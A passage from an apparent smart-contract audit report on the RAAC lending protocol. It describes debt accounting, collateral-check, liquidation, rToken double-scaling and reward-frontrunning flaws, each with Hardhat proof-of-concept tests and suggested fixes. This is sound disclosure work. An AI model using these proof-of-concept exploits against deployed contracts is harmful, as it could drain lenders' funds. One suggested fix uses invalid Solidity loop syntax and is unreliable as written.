  const reservedata1 = await lendingPool.getAllUserData(user1.address);
  console.log(`secondborrowusageindex`, reservedata1.usageIndex);

  const secondborrowexpecteddebt = await reserveLibrary.raymul(
    reservedata1.scaledDebtBalance,
    reservedata1.usageIndex
  );

  console.log(reservedata1.scaledDebtBalance);

  console.log(`secondborrowexpecteddebt`, secondborrowexpecteddebt);
  const secondborrowdebtBalance = await debtToken.balanceOf(user1.address);
  console.log("secondborrowdebtBalance", secondborrowdebtBalance);

  //c proof that the expecteddebt is now less than the debt balance after second borrow which shows discrepancy and leads to underflow
  assert(secondborrowdebtBalance > secondborrowexpecteddebt);

  //c when user attempts to repay their debt according to the debt token contract balanceOf function, there will be an underflow as the expected debt is less than the debt balance
  await expect(lendingPool.connect(user1).repay(secondborrowdebtBalance)).to.be
    .reverted;
});
```

## Impact

Users can repay less than they actually owe, leading to a loss of funds for the protocol.
Denial-of-Service (DOS): If users attempt to fully repay their debt, an underflow occurs, causing the transaction to revert and preventing repayment.
Bad Debt Accumulation: The protocol could end up with unaccounted liabilities, making liquidation and debt resolution unreliable.

## Tools Used

Manual Review, Hardhat

## Recommendations

To resolve this issue, remove the balanceIncrease addition in DebtToken::mint, ensuring that the minted debt tokens match the scaled debt in LendingPool.

Current Code

```solidity
uint256 amountToMint = amount + balanceIncrease;
```

Refactored Code

```solidity
uint256 amountToMint = amount;
```

This ensures that DebtToken::balanceOf(user) correctly reflects LendingPool::user.scaledDebtBalance, preventing underpayment of debt, repayment underflows, and Denial-of-Service attacks.

## <a id='H-05'></a>H-05. User can borrow more than their collateral leading to insolvent positions and undercollateralization

## Summary

The LendingPool contract contains a vulnerability in its borrow function that allows users with RAACNft to borrow more than their collateral value. This issue arises from an improper collateral check, potentially leading to insolvent positions and bad debt for the protocol.

## Vulnerability Details

LendingPool::borrow allows users with RAACNft to borrow assets from the protocol. See function below:

```solidity
 /**
     * @notice Allows a user to borrow reserve assets using their NFT collateral
     * @param amount The amount of reserve assets to borrow
     */
    function borrow(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        if (isUnderLiquidation[msg.sender]) revert CannotBorrowUnderLiquidation();

        UserData storage user = userData[msg.sender];

        uint256 collateralValue = getUserCollateralValue(msg.sender);

        if (collateralValue == 0) revert NoCollateral();

        // Update reserve state before borrowing
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Ensure sufficient liquidity is available
        _ensureLiquidity(amount);

        // Fetch user's total debt after borrowing
        uint256 userTotalDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex) + amount;

        // Ensure the user has enough collateral to cover the new debt
        if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
            revert NotEnoughCollateralToBorrow();
        }

        // Update user's scaled debt balance
        uint256 scaledAmount = amount.rayDiv(reserve.usageIndex);


        // Mint DebtTokens to the user (scaled amount)
       (bool isFirstMint, uint256 amountMinted, uint256 newTotalSupply) = IDebtToken(reserve.reserveDebtTokenAddress).mint(msg.sender, msg.sender, amount, reserve.usageIndex);

        // Transfer borrowed amount to user
        IRToken(reserve.reserveRTokenAddress).transferAsset(msg.sender, amount);

        user.scaledDebtBalance += scaledAmount;
        // reserve.totalUsage += amount;
        reserve.totalUsage = newTotalSupply;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, 0, amount);

        // Rebalance liquidity after borrowing
        _rebalanceLiquidity();

        emit Borrow(msg.sender, amount);
    }
```

The vulnerability lies in the following line:

```solidity
 if (collateralValue < userTotalDebt.percentMul(liquidationThreshold)) {
            revert NotEnoughCollateralToBorrow();
        }
```

The line checks if the user's collateral value is less than a percentage of their debt. This means that if the collateral value is higher than whatever that percentage is, it means that the user can borrow more than their collateral which removes the incentive to repay debt and leaves the protocol with bad debt via insolvent positions.

## Proof Of Code (POC)

This test was run in the LendingPool.test.js file in the "Borrow and repay" describe block

```javascript
it("user can borrow more than their collateral", async function () {
  //c for testing purposes
  const userCollateral = await lendingPool.getUserCollateralValue(
    user1.address
  );
  console.log("userCollateral", userCollateral);

  const borrowAmount = userCollateral + ethers.parseEther("20");
  console.log("borrowAmount", borrowAmount);
  await lendingPool.connect(user1).borrow(borrowAmount);
  assert(borrowAmount > userCollateral);
});
```

## Impact

Users can borrow more than their collateral, leading to insolvency risks.

The protocol could accumulate bad debt due to users defaulting on excessive loans.

Attackers could exploit this issue to drain liquidity from the protocol, harming lenders and destabilizing the system.

## Tools Used

Manual Review, Hardhat

## Recommendations

Use a More Accurate Collateralization Check: Modify the borrowing condition to ensure that a user’s collateral value must always exceed their debt based on a stricter collateralization ratio.

Example fix:

```solidity
if (collateralValue * COLLATERAL_RATIO < userTotalDebt) {
    revert NotEnoughCollateralToBorrow();
}
```

Introduce Safe Borrow Limits: Implement a maximum Loan-To-Value (LTV) ratio to prevent excessive borrowing.

## <a id='H-06'></a>H-06. User can withdraw their deposited NFT with borrowed debt > collateral leading to insolvent positions

## Summary

The LendingPool contract contains a vulnerability in its withdrawNFT function that allow users with RAACNft to manipulate collateral calculations and create insolvent positions. This issue arises from improper collateral checks, potentially leading to bad debt for the protocol.

## Vulnerability Details

When a user deposits an NFT to the lending pool contract, it acts as collateral to borrow against. Users can also withdraw their deposited nft via LendingPool::withdrawNFT. See function below:

```solidity
 /**
     * @notice Allows a user to withdraw an NFT
     * @param tokenId The token ID of the NFT to withdraw
     */
    function withdrawNFT(uint256 tokenId) external nonReentrant whenNotPaused {
        if (isUnderLiquidation[msg.sender]) revert CannotWithdrawUnderLiquidation();

        UserData storage user = userData[msg.sender];
        if (!user.depositedNFTs[tokenId]) revert NFTNotDeposited();

        // update state
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Check if withdrawal would leave user undercollateralized
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        uint256 collateralValue = getUserCollateralValue(msg.sender);
        uint256 nftValue = getNFTPrice(tokenId);

        if (collateralValue - nftValue < userDebt.percentMul(liquidationThreshold)) {
            revert WithdrawalWouldLeaveUserUnderCollateralized();
        }

        // Remove NFT from user's deposited NFTs
        for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
            if (user.nftTokenIds[i] == tokenId) {
                user.nftTokenIds[i] = user.nftTokenIds[user.nftTokenIds.length - 1];
                user.nftTokenIds.pop();
                break;
            }
        }
        user.depositedNFTs[tokenId] = false;

        raacNFT.safeTransferFrom(address(this), msg.sender, tokenId);

        emit NFTWithdrawn(msg.sender, tokenId);
    }

```

The exploit occurs where an attacker can deposit multiple nfts, use these as collateral to borrow assets and then be able to withdraw nfts from RAAC leaving them with more debt than their collateral which creates insolvent positions and bad debt for RAAC.

## Proof Of Code (POC)

The following test was run in LendingPool.test.js in the "borrow and repay" describe block.

```javascript
it("user can withdraw their nft when in debt", async function () {
  //c for testing purposes

  await raacHousePrices.setHousePrice(2, ethers.parseEther("100"));

  const amountToPay = ethers.parseEther("100");

  //c mint nft for user1. this mints an extra nft for the user. in the before each of the initial describe in LendingPool.test.js, user1 already has an nft
  const tokenId = 2;
  await token.mint(user1.address, amountToPay);

  await token.connect(user1).approve(raacNFT.target, amountToPay);

  await raacNFT.connect(user1).mint(tokenId, amountToPay);

  //c depositnft for user1
  await raacNFT.connect(user1).approve(lendingPool.target, tokenId);
  await lendingPool.connect(user1).depositNFT(tokenId);

  //c user borrows debt
  const borrowAmount = ethers.parseEther("110");
  console.log("borrowAmount", borrowAmount);
  await lendingPool.connect(user1).borrow(borrowAmount);

  //c user can withdraw one of their nfts which makes their debt worth more than their collateral
  await lendingPool.connect(user1).withdrawNFT(tokenId);

  const userCollateral = await lendingPool.getUserCollateralValue(
    user1.address
  );
  console.log("userCollateral", userCollateral);

  const user1debt = await debtToken.balanceOf(user1.address);
  console.log("user1debt", user1debt);

  assert(user1debt > userCollateral);
});
```

## Impact

Users can withdraw NFTs even when their debt exceeds their collateral, leading to insolvency.

Users can borrow more than their collateral, creating systemic risk.

The protocol could accumulate bad debt due to users defaulting on excessive loans.

Attackers could exploit this issue to drain liquidity from the protocol, harming lenders and destabilizing the system.

## Tools Used

Manual Review, Hardhat

## Recommendations

Use a More Accurate Collateralization Check: Modify the borrowing condition to ensure that a user’s collateral value must always exceed their debt based on a stricter collateralization ratio.

Example fix:

```solidity
if (collateralValue * COLLATERAL_RATIO < userTotalDebt) {
    revert NotEnoughCollateralToBorrow();
}
```

Introduce Safe Borrow Limits: Implement a maximum Loan-To-Value (LTV) ratio to prevent excessive borrowing.

Prevent Sequential NFT Withdrawals: Implement an aggregate collateral check that considers the total NFTs being withdrawn. Enforce a cooldown period between withdrawals to prevent rapid depletion of collateral.

## <a id='H-07'></a>H-07. User can repay their debt after grace period ends and liquidation has been initiated which reduces liquidation risk for borrowers

## Summary

Users with unhealthy positions can repay their debt after the liquidation process has been initiated, allowing them to avoid liquidation. This undermines the protocol's liquidation mechanism and poses risks to the stability of the system.

## Vulnerability Details

When a user borrows via LendingPool::borrow , they are allowed to repay their debt using LendingPool::\_repay. See function below:

```solidity
 /**
     * @notice Internal function to repay borrowed reserve assets
     * @param amount The amount to repay
     * @param onBehalfOf The address of the user whose debt is being repaid. If address(0), msg.sender's debt is repaid.
     * @dev This function allows users to repay their own debt or the debt of another user.
     *      The caller (msg.sender) provides the funds for repayment in both cases.
     *      If onBehalfOf is set to address(0), the function defaults to repaying the caller's own debt.
     */
    function _repay(uint256 amount, address onBehalfOf) internal {
        if (amount == 0) revert InvalidAmount();
        if (onBehalfOf == address(0)) revert AddressCannotBeZero();

        UserData storage user = userData[onBehalfOf];

        // Update reserve state before repayment
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Calculate the user's debt (for the onBehalfOf address)
        uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
        uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);

        // If amount is greater than userDebt, cap it at userDebt
        uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;

        uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);

        // Burn DebtTokens from the user whose debt is being repaid (onBehalfOf)
        // is not actualRepayAmount because we want to allow paying extra dust and we will then cap there
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) =
            IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);

        // Transfer reserve assets from the caller (msg.sender) to the reserve
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);

        reserve.totalUsage = newTotalSupply;
        user.scaledDebtBalance -= amountBurned;

        // Update liquidity and interest rates
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);

        emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
    }
```

There is a health factor implemented in RAAC which calculates the health of a user's position and 2 factors are used to determine if a user can be liquidated. The first is the health factor being below a target set by RAAC. If the user's health factor is below target, there is a grace period also configured by RAAC that gives the user an amount of time to get their position back healthy. If the user defaults on this and the grace period passes, LendingPool::initiateLiquidation can be called by any user which begins the liquidation process for the user with the unhealthy position. See function below:

```solidity
 /**
     * @notice Allows anyone to initiate the liquidation process if a user's health factor is below threshold
     * @param userAddress The address of the user to liquidate
     */
    function initiateLiquidation(
        address userAddress
    ) external nonReentrant whenNotPaused {
        if (isUnderLiquidation[userAddress])
            revert UserAlreadyUnderLiquidation();

        // update state

        ReserveLibrary.updateReserveState(reserve, rateData);

        UserData storage user = userData[userAddress];

        uint256 healthFactor = calculateHealthFactor(userAddress);

        if (healthFactor >= healthFactorLiquidationThreshold)
            revert HealthFactorTooLow();

        isUnderLiquidation[userAddress] = true;
        liquidationStartTime[userAddress] = block.timestamp;

        emit LiquidationInitiated(msg.sender, userAddress);
    }

```

The issue occurs where any user with any unhealthy position can still repay their debt after LendingPool::initiateLiquidation is called. LendingPool::initiateLiquidation is the initialization process of a liquidation. Once this function is called, the stability pool then calls a function to liquidate the user at any point. At any time between these 2 functions, the user with the unhealthy position could simply repay their debt and stop themselves from being liquidated which shouldn't be the case as once a user's position is to be liquidated, they should not be able to repay.

## Proof Of Code (POC)

This test was run in LendingPool.test.js in the "borrow and repay" describe block

```javascript
it("user can repay their debt after grace period ends and liquidation has been initiated", async function () {
  //c for testing purposes

  //c for testing purposes
  const userCollateral = await lendingPool.getUserCollateralValue(
    user1.address
  );
  console.log("userCollateral", userCollateral);

  //c user borrows 90% of their collateral which puts their health factor below 1 and qualifies them for liquidation
  const borrowAmount = ethers.parseEther("90");
  console.log("borrowAmount", borrowAmount);
  await lendingPool.connect(user1).borrow(borrowAmount);

  //c calculate user's health factor
  const healthFactor = await lendingPool.calculateHealthFactor(user1.address);
  console.log("healthFactor", healthFactor);
  assert(
    healthFactor <
      (await lendingPool.BASE_HEALTH_FACTOR_LIQUIDATION_THRESHOLD())
  );

  //c allow grace period to pass
  await time.increase(4 * 24 * 60 * 60);

  const reservedata1 = await lendingPool.getAllUserData(user1.address);
  const userscaleddebtprerepay = reservedata1.scaledDebtBalance;
  console.log(`userscaleddebt`, userscaleddebtprerepay);

  //c someone initiates liquidation
  await lendingPool.connect(user2).initiateLiquidation(user1.address);

  //c since grace period has passed and user has not been liquidated, they can repay their debt
  await lendingPool.connect(user1).repay(borrowAmount);
  const reservedata = await lendingPool.getAllUserData(user1.address);
  const userscaleddebt = reservedata.scaledDebtBalance;
  console.log(`userscaleddebt`, userscaleddebt);

  assert(userscaleddebt < userscaleddebtprerepay);
});
```

## Impact

Undermined Liquidation Mechanism: Users can bypass liquidation by repaying their debt after the process has been initiated, reducing the effectiveness of the protocol's risk management system.

Increased Protocol Risk: If users are allowed to avoid liquidation, the protocol may accumulate bad debt, leading to financial instability.

Unfair Advantage: Users with unhealthy positions can manipulate the system to avoid penalties, disadvantaging other participants.

## Tools Used

Manual Review, Hardhat

## Recommendations

To address this issue, the \_repay function should be modified to prevent users from repaying their debt once the liquidation process has been initiated. Here’s how this can be implemented:

Updated \_repay Function
Add a check to ensure that the user is not under liquidation:

```solidity

function _repay(uint256 amount, address onBehalfOf) internal {
    if (amount == 0) revert InvalidAmount();
    if (onBehalfOf == address(0)) revert AddressCannotBeZero();

    // Prevent repayment if the user is under liquidation
    if (isUnderLiquidation[onBehalfOf]) {
        revert CannotRepayUnderLiquidation();
    }

    UserData storage user = userData[onBehalfOf];

    // Update reserve state before repayment
    ReserveLibrary.updateReserveState(reserve, rateData);

    // Calculate the user's debt (for the onBehalfOf address)
    uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
    uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);

    // If amount is greater than userDebt, cap it at userDebt
    uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;

    uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);

    // Burn DebtTokens from the user whose debt is being repaid (onBehalfOf)
    (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) =
        IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);

    // Transfer reserve assets from the caller (msg.sender) to the reserve
    IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);

    reserve.totalUsage = newTotalSupply;
    user.scaledDebtBalance -= amountBurned;

    // Update liquidity and interest rates
    ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);

    emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
}
```

Additional Recommendations

Grace Period Enforcement: Ensure that the grace period is strictly enforced and cannot be bypassed by repayments.

## <a id='H-08'></a>H-08. Transferring rToken devalues it via double scaling

## Summary

The RToken implementation suffers from a double-scaling issue during token transfers, where the transfer amount is scaled twice: once in the RToken::transfer function and again in the RToken::\_update function. This results in the transferred tokens being devalued unnecessarily, causing incorrect token balances and potential financial losses for users.

## Vulnerability Details

When a user deposits assets via LendingPool::deposit, they are minted rTokens. See below:

```solidity
 /**
     * @notice Allows a user to deposit reserve assets and receive RTokens
     * @param amount The amount of reserve assets to deposit
     */
    function deposit(uint256 amount) external nonReentrant whenNotPaused onlyValidAmount(amount) {
        // Update the reserve state before the deposit
        ReserveLibrary.updateReserveState(reserve, rateData);

        // Perform the deposit through ReserveLibrary
        uint256 mintedAmount = ReserveLibrary.deposit(reserve, rateData, amount, msg.sender);

        // Rebalance liquidity after deposit
        _rebalanceLiquidity();

        emit Deposit(msg.sender, amount, mintedAmount);
    }

/**
     * @notice Handles deposit operation into the reserve.
     * @dev Transfers the underlying asset from the depositor to the reserve, and mints RTokens to the depositor.
     *      This function assumes interactions with ERC20 before updating the reserve state (you send before we update how much you sent).
     *      A untrusted ERC20's modified mint function calling back into this library will cause incorrect reserve state updates.
     *      Implementing contracts need to ensure reentrancy guards are in place when interacting with this library.
     * @param reserve The reserve data.
     * @param rateData The reserve rate parameters.
     * @param amount The amount to deposit.
     * @param depositor The address of the depositor.
     * @return amountMinted The amount of RTokens minted.
     */
    function deposit(
        ReserveData storage reserve,
        ReserveRateData storage rateData,
        uint256 amount,
        address depositor
    ) internal returns (uint256 amountMinted) {
        if (amount < 1) revert InvalidAmount();

        // Update reserve interests
        updateReserveInterests(reserve, rateData);

        // Transfer asset from caller to the RToken contract
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(
            msg.sender, // from
            reserve.reserveRTokenAddress, // to
            amount // amount
        );

        // Mint RToken to the depositor (scaling handled inside RToken)
        (
            bool isFirstMint,
            uint256 amountScaled,
            uint256 newTotalSupply,
            uint256 amountUnderlying
        ) = IRToken(reserve.reserveRTokenAddress).mint(
                address(this), // caller
                depositor, // onBehalfOf
                amount, // amount
                reserve.liquidityIndex // index
            );

        amountMinted = amountScaled;

        // Update the total liquidity and interest rates
        updateInterestRatesAndLiquidity(reserve, rateData, amount, 0);

        emit Deposit(depositor, amount, amountMinted);

        return amountMinted;
    }

```

The amount of rTokens minted to the user are normalized to allow for value accrual as the liquidity index increases. This is done in RToken::\_update which overides the normal ERC20 \_update function. See below:

```solidity
/**
     * @dev Internal function to handle token transfers, mints, and burns
     * @param from The sender address
     * @param to The recipient address
     * @param amount The amount of tokens
     */
    function _update(
        address from,
        address to,
        uint256 amount
    ) internal override {
        // Scale amount by normalized income for all operations (mint, burn, transfer)
        uint256 scaledAmount = amount.rayDiv(
            ILendingPool(_reservePool).getNormalizedIncome()
        );
        super._update(from, to, scaledAmount);
    }

```

The issue occurs when a user attempts to transfer tokens to another user, the amount is being scaled twice before it is being sent which devalues the rtokens unneccesarily. It is scaled once in RToken:: \_update and again in RToken::transfer See below:

```solidity
/**
     * @dev Overrides the ERC20 transfer function to use scaled amounts
     * @param recipient The recipient address
     * @param amount The amount to transfer (in underlying asset units)
     */
    function transfer(
        address recipient,
        uint256 amount
    ) public override(ERC20, IERC20) returns (bool) {
        uint256 scaledAmount = amount.rayDiv(
            ILendingPool(_reservePool).getNormalizedIncome()
        );
        return super.transfer(recipient, scaledAmount);
    }

```

As a result, the transferred tokens aren't reflected in the receiver's balance.

## Proof Of Code (POC)

The following test was run in LendingPool.test.js in the "Borrow and Repay" describe block

```javascript
it("transfering rtokens devalues them via double scaling issue", async function () {
  //c for testing purposes
  const reserve = await lendingPool.reserve();
  console.log("reserve", reserve.lastUpdateTimestamp);

  //c first borrow that updates liquidity index and interest rates as deposits dont update it
  const depositAmount = ethers.parseEther("100");
  await lendingPool.connect(user1).borrow(depositAmount);
  await time.increase(5000 * 24 * 60 * 60);
  await ethers.provider.send("evm_mine");

  //c user deposits tokens into lending pool to get rtokens

  await lendingPool.connect(user1).deposit(depositAmount);

  const reservedata = await lendingPool.getAllUserData(user1.address);
  console.log(`liqindex`, reservedata.liquidityIndex);

  //c get scaled rtokenbalance of user1
  const user1RTokenBalance = await rToken.scaledBalanceOf(user1.address);
  console.log("user1RTokenBalance", user1RTokenBalance);

  //c get user2 token balance before transfer
  const pretransferuser2RTokenBalance = await rToken.scaledBalanceOf(
    user2.address
  );
  console.log("pretransferuser2RTokenBalance", pretransferuser2RTokenBalance);

  //c proof that rtokens are scaled upon minting
  assert(user1RTokenBalance < depositAmount);

  const transferAmount = ethers.parseEther("50");
  //c user transfers rtoken to user2
  await rToken.connect(user1).transfer(user2.address, transferAmount);

  //c get rtokenbalance of user2
  const user2RTokenBalance = await rToken.scaledBalanceOf(user2.address);
  console.log("user2RTokenBalance", user2RTokenBalance);

  //c get amount transferred to user 2
  const amountTransferred = user2RTokenBalance - pretransferuser2RTokenBalance;
  console.log("amountTransferred", amountTransferred);

  //c single scaled transfer amount

  /*c IMPORTANT: for this test to work, first go to reservelibrarymock.sol and include the following functions:
      function raymul(
        uint256 val1,
        uint256 val2
    ) external pure returns (uint256) {
        return val1.rayMul(val2);
    }

     function raydiv(
        uint256 val1,
        uint256 val2
    ) external pure returns (uint256) {
        return val1.rayDiv(val2);
    }
       
       
       then deploy the contract with the following lines:
        const reservelibrary = await ethers.getContractFactory(
      "ReserveLibraryMock"
    );
    reserveLibrary = await reservelibrary.deploy();
    */
  const normalizedincome = await lendingPool.getNormalizedIncome();
  console.log("normalizedincome", normalizedincome);

  const singlescaledtamount = await reserveLibrary.raydiv(
    transferAmount,
    normalizedincome
  );

  const amount1 = await rToken.amount1();
  console.log("amount1", amount1);

  //c proof that rtokens are double scaled upon transfer further devauling them
  assert(amountTransferred < singlescaledtamount);

  //c when the amount is transferred to the user, the actual amount does not equal the amount transferred which shows that the rtokens are double scaled
  const amounttransferredunscaled = await reserveLibrary.raymul(
    amountTransferred,
    normalizedincome
  );

  assert(amounttransferredunscaled < transferAmount);
});
```

## Impact

Financial Loss: Users lose value when transferring rTokens, as the transferred amount is devalued due to double-scaling.

Incorrect Balances: Token balances for both the sender and recipient are incorrect, leading to accounting discrepancies.

## Tools Used

Manual Review, Hardhat

## Recommendations

To fix this issue, the double-scaling should be eliminated by ensuring the transfer amount is scaled only once. This can be achieved by modifying the RToken::transfer function to avoid scaling the amount before passing it to super.transfer.

Updated RToken::transfer Function
Remove the scaling logic from the transfer function, as scaling is already handled in \_update:

```solidity
/**
 * @dev Overrides the ERC20 transfer function to use unscaled amounts
 * @param recipient The recipient address
 * @param amount The amount to transfer (in underlying asset units)
 */
function transfer(
    address recipient,
    uint256 amount
) public override(ERC20, IERC20) returns (bool) {
    // Do not scale the amount here; scaling is handled in _update
    return super.transfer(recipient, amount);
}
```

The transfer function now passes the unscaled amount to super.transfer. The \_update function will handle the scaling of the amount, ensuring it is scaled only once. This ensures that the transferred amount is correctly reflected in the recipient's balance without unnecessary devaluation.

## <a id='H-09'></a>H-09. Sandwich Opportunity presented via stepwise reward distribution

## Summary

The vulnerability identified in the StabilityPool contract allows malicious actors to frontrun legitimate users' withdrawal transactions to claim a disproportionate share of RAAC rewards. This is possible due to the stepwise accumulation of RAAC rewards over blocks, which can be exploited by depositing a large amount of rTokens just before a legitimate user withdraws their stake. This dilutes the rewards for the legitimate user and allows the attacker to claim a significant portion of the rewards without having staked for a long period.

## Vulnerability Details

Users can stake their rTokens and get minted DeTokens to represent their rToken stake. The rToken stake deposited using the stability pool is eligible for RAAC token rewards that accrue and are claimable upon withdrawal. See StabilityPool::withdraw :

```solidity
 /**
     * @notice Allows a user to withdraw their rToken and RAAC rewards.
     * @param deCRVUSDAmount Amount of deToken to redeem.
     */
    function withdraw(uint256 deCRVUSDAmount) external nonReentrant whenNotPaused validAmount(deCRVUSDAmount) {
        _update();
        if (deToken.balanceOf(msg.sender) < deCRVUSDAmount) revert InsufficientBalance();

        uint256 rcrvUSDAmount = calculateRcrvUSDAmount(deCRVUSDAmount);
        uint256 raacRewards = calculateRaacRewards(msg.sender);
        if (userDeposits[msg.sender] < rcrvUSDAmount) revert InsufficientBalance();
        userDeposits[msg.sender] -= rcrvUSDAmount;

        if (userDeposits[msg.sender] == 0) {
            delete userDeposits[msg.sender];
        }

        deToken.burn(msg.sender, deCRVUSDAmount);
        rToken.safeTransfer(msg.sender, rcrvUSDAmount);
        if (raacRewards > 0) {
            raacToken.safeTransfer(msg.sender, raacRewards);
        }

        emit Withdraw(msg.sender, rcrvUSDAmount, deCRVUSDAmount, raacRewards);
    }
```

The withdraw function contains an \_update function as seen above which is responsible for minting RAAC tokens from an RAACMinter contract. See below:

```solidity
/**
     * @dev Internal function to update state variables.
     */
    function _update() internal {
       _mintRAACRewards();
    }

 /**
     * @dev Internal function to mint RAAC rewards.
     */
    function _mintRAACRewards() internal {
        if (address(raacMinter) != address(0)) {
            raacMinter.tick();
        }
    }
```

RAACMinter::tick works by multiplying the emission rate per block by the number of blocks that have passed since it was last called. See below:

```solidity
/**
     * @dev Triggers the minting process and updates the emission rate if the interval has passed
     */
    function tick() external nonReentrant whenNotPaused {
        if (emissionUpdateInterval == 0 || block.timestamp >= lastEmissionUpdateTimestamp + emissionUpdateInterval) {
            updateEmissionRate();
        }
        uint256 currentBlock = block.number;
        uint256 blocksSinceLastUpdate = currentBlock - lastUpdateBlock;
        if (blocksSinceLastUpdate > 0) {
            uint256 amountToMint = emissionRate * blocksSinceLastUpdate;

            if (amountToMint > 0) {
                excessTokens += amountToMint;
                lastUpdateBlock = currentBlock;
                raacToken.mint(address(stabilityPool), amountToMint);
                emit RAACMinted(amountToMint);
            }
        }
    }

```

The issue with this is it presents an opportunity for front runners to maliciously sandwich user's withdrawals after a significant number of blocks have past. The more blocks that pass, the larger the RAAC rewards for stakers which incentivizes users to stake for longer to get a larger share of the rewards. The issue is that the more blocks that pass without RAACMinter being called, the higher the stepwise jump in RAAC rewards which incentivises a user to watch for an accumulation of rewards in the pool and watch for a normal actor calling the withdraw function to get their stake and frontrun this transaction with a deposit which will allow the malicious actor to get a large reward amount without staking for the same amount of time as the normal actor which dilutes the expected reward amount from the normal actor. The malicious actor can simply withdraw after this user's transaction and be able to get more RAAC rewards despite having only staked for a few seconds.

## Proof Of Code (POC)

This test was run in StabilityPool.test.js in the "Deposits" describe block:

```javascript
it("frontrun opportunity due to stepwise jump", async function () {
  //c for testing purposes.

  //c at the moment, user 2 is the only one who has deposited into the stability pool so they are poised to get all the rewards
  const depositAmount = ethers.parseEther("50");
  await stabilityPool.connect(user2).deposit(depositAmount);

  const stabilitypoolbal = await raacToken.balanceOf(stabilityPool.target);
  console.log("stabilitypoolbal", stabilitypoolbal.toString());

  //c wait for some time to pass so RAAC rewards can accrue
  //c calculate reward amount that will be minted when user2 withdraws
  await ethers.provider.send("evm_increaseTime", [86400]);
  await ethers.provider.send("evm_mine");
  await raacMinter.tick();
  const rewardAmount = await raacMinter.amountToMint();

  console.log("rewardAmount", rewardAmount);

  const user2pendingReward = await stabilityPool.getPendingRewards(
    user2.address
  );
  console.log("user2pendingReward", user2pendingReward.toString());

  //c user1 sees in mempool that user2 is about to withdraw and front runs and deposits a large amount of rtokens to get majority of the rewards leaving user 2 with a lot less rewards
  const frontrunAmount = ethers.parseEther("500");
  await stabilityPool.connect(user1).deposit(frontrunAmount);

  await stabilityPool.connect(user2).withdraw(depositAmount);
  const user2bal = await raacToken.balanceOf(user2.address);
  console.log("user2bal", user2bal.toString());

  await stabilityPool.connect(user1).withdraw(depositAmount);
  const user1bal = await raacToken.balanceOf(user1.address);
  console.log("user1bal", user1bal.toString());

  const rewardDiff = user2pendingReward - user2bal;
  console.log("rewardDiff", rewardDiff.toString());

  assert(user2bal < rewardAmount);
  assert(user1bal > user2bal);
});
```

## Impact

Loss of Rewards for Legitimate Users: Legitimate users who have staked their rTokens for a long time will receive fewer rewards than expected due to the dilution caused by the attacker's frontrunning deposit.

Incentive Misalignment: The protocol's incentive mechanism is undermined, as users are discouraged from staking for long periods if their rewards can be easily stolen by malicious actors.

## Tools Used

Manual Review, Hardhat

## Recommendations

Continuous Reward Distribution
Instead of minting rewards in a stepwise manner when withdraw is called, distribute rewards continuously on a per-block basis. This can be achieved by updating the reward accumulation logic to calculate rewards based on the exact number of blocks a user has staked, rather than the total blocks since the last update.

```solidity
function _update() internal {
    uint256 currentBlock = block.number;
    uint256 blocksSinceLastUpdate = currentBlock - lastUpdateBlock;
    if (blocksSinceLastUpdate > 0) {
        uint256 totalRewards = emissionRate * blocksSinceLastUpdate;
        if (totalRewards > 0) {
            // Distribute rewards proportionally to all stakers
            _distributeRewards(totalRewards);
            lastUpdateBlock = currentBlock;
        }
    }
}

function _distributeRewards(uint256 totalRewards) internal {
    uint256 totalStake = totalStaked();
    if (totalStake > 0) {
        uint256 rewardPerStake = totalRewards / totalStake;
        // Update each user's reward balance based on their stake
        for (address user : stakers) {
            userRewards[user] += userStakes[user] * rewardPerStake;
        }
    }
}
```

2. Deposit Cooldown Period
   Introduce a cooldown period for deposits, during which new deposits are not eligible for rewards. This prevents attackers from frontrunning withdrawals to claim rewards.

```solidity
uint256 public constant DEPOSIT_COOLDOWN = 86400; // 24 hours


function deposit(uint256 amount) external nonReentrant whenNotPaused validAmount(amount) {
    require(block.timestamp >= lastDepositTimestamp[msg.sender] + DEPOSIT_COOLDOWN, "Deposit cooldown active");
    lastDepositTimestamp[msg.sender] = block.timestamp;
    // Rest of the deposit logic
}
```

## <a id='H-10'></a>H-10. User is wrongfully liquidated when health factor is above threshold

## Summary

The vulnerability allows the Stability Pool to liquidate users whose positions have become healthy due to collateral value appreciation during the liquidation grace period. This occurs because the protocol does not revalidate the health factor before finalizing the liquidation, leading to unfair liquidations of positions that no longer meet the criteria.

## Vulnerability Details

Users who have deposited RAACNft's into the protocol are allowed to borrow assets from the rToken vault via the LendingPool::borrow

```solidity
/**
     * @notice Allows a user to borrow reserve assets using their NFT collateral
     * @param amount The amount of reserve assets to borrow
     */
